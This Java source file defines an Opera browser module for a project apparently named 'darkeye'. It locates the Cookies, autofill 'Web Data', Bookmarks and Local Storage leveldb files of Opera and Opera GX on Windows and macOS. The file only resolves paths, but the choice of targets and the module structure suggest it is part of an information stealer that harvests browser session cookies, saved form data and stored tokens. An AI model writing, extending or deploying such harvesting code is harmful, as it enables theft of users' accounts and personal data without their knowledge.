package org.spray.darkeye.module.browsers;

import java.io.File;

import org.spray.darkeye.module.BrowserModule;
import org.spray.darkeye.utils.OSTools;

public class OperaBrowser extends BrowserModule {

	private String[] operaVersions = new String[] { "Opera Stable", "Opera GX Stable" };

	public OperaBrowser() {
		super("Opera");
	}

	@Override
	public String getCookie() {
		return getFolder() + "/Cookies";
	}

	@Override
	public String getAutoFill() {
		String data = OSTools.isOSLinux() ? "Web\\ Data" : "Web Data";
		return getFolder() + "/" + data;
	}

	@Override
	public String getBookmarks() {
		return getFolder() + "/Bookmarks";
	}

	@Override
	public String getLevelDB() {
		return getFolder() + "/Local Storage/leveldb";
	}

	private String getFolder() {
		String folder = "";
		switch (OSTools.getType()) {
		case Windows:
			folder = getOpera(System.getenv("APPDATA") + "/Opera Software/");
			break;
		case MacOS:
			folder = "/Library/Application Support/com.operasoftware.Opera";
			break;
		case Linux:
			// ???
			break;
		default:
			break;
		}
		return folder;
	}

	private String getOpera(String path) {
		String opera = "";
		for (String version : operaVersions) {
			File operaPath = new File(path, version);
			if (operaPath.exists()) {
				opera = operaPath.getAbsolutePath();
			}
		}
		return opera;
	}
}
